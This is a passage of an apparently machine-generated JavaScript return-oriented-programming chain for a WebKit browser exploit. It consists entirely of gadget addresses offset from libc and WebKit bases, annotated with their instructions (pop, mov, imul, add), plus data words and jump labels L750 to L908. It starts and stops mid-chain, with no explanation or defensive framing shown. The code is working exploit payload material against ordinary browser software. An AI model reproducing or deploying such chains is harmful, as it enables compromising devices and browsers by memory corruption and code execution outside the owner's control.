libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+95368, //L751
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L750:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L751:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L752:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+95456, //L753
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L753:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+95512, //L755
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L755:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+95624, //L759
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L757:
db([10, 0]); // 0xa
set_gadget(libc_base+772328,); //pop rcx
//L758:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L759:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+95704, //L760
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+95720, //L761
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L760:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L761:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+95808, //L762
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L762:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+95864, //L764
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L764:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+95936, //L766
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L766:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+95992, //L768
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L768:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L770:
webkit_base+14572727, //mov [rax], rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+96144, //L772
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L771:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L772:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+96248, //L775
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+96232, //L774
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L774:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L775:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+96392, //L779
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+96360, //L777
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+96376, //L778
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L777:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L778:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L779:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+96464, //L780
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L780:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+96520, //L782
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L782:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+96632, //L786
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L784:
db([11, 0]); // 0xb
set_gadget(libc_base+772328,); //pop rcx
//L785:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L786:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+96712, //L787
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+96728, //L788
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L787:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L788:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+96816, //L789
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L789:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+96872, //L791
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L791:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+96944, //L793
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L793:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+97000, //L795
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L795:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L797:
libc_base+845410, //mov rax, rsi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+97152, //L799
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L798:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L799:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+97256, //L802
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+97240, //L801
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L801:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L802:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+97400, //L806
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+97368, //L804
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+97384, //L805
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L804:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L805:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L806:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+97472, //L807
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L807:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+97528, //L809
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L809:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+97640, //L813
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L811:
db([12, 0]); // 0xc
set_gadget(libc_base+772328,); //pop rcx
//L812:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L813:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+97720, //L814
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+97736, //L815
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L814:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L815:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+97824, //L816
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L816:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+97880, //L818
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L818:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+97952, //L820
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L820:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+98008, //L822
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L822:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L824:
libc_base+713278, //pop rsi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+98160, //L826
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L825:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L826:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+98264, //L829
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+98248, //L828
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L828:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L829:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+98408, //L833
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+98376, //L831
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+98392, //L832
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L831:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L832:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L833:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+98480, //L834
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L834:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+98536, //L836
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L836:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+98648, //L840
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L838:
db([13, 0]); // 0xd
set_gadget(libc_base+772328,); //pop rcx
//L839:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L840:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+98728, //L841
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+98744, //L842
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L841:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L842:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+98832, //L843
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L843:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+98888, //L845
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L845:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+98960, //L847
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L847:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+99016, //L849
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L849:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+99120, //L852
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L851:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L852:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+99224, //L855
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+99208, //L854
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L854:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L855:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+99368, //L859
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+99336, //L857
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+99352, //L858
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L857:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L858:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L859:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+99440, //L860
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L860:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+99496, //L862
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L862:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+99608, //L866
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L864:
db([5, 0]); // 0x5
set_gadget(libc_base+772328,); //pop rcx
//L865:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L866:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+99688, //L867
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+99704, //L868
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L867:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L868:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+99792, //L869
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L869:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+99848, //L871
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L871:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+99968, //L874
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L873:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L874:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+100072, //L877
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+100056, //L876
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L876:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L877:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+100216, //L881
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+100184, //L879
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+100200, //L880
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L879:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L880:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L881:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+100288, //L882
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L882:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+100344, //L884
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L884:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+100456, //L888
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L886:
db([14, 0]); // 0xe
set_gadget(libc_base+772328,); //pop rcx
//L887:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L888:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+100536, //L889
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+100552, //L890
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L889:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L890:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+100640, //L891
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L891:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+100696, //L893
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L893:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+100768, //L895
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L895:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+100824, //L897
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L897:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L899:
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+100976, //L901
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L900:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L901:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+101080, //L904
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+101064, //L903
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L903:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L904:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+101224, //L908
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+101192, //L906
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+101208, //L907
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L906:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L907:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L908:
db([0, 0]); // 0x0
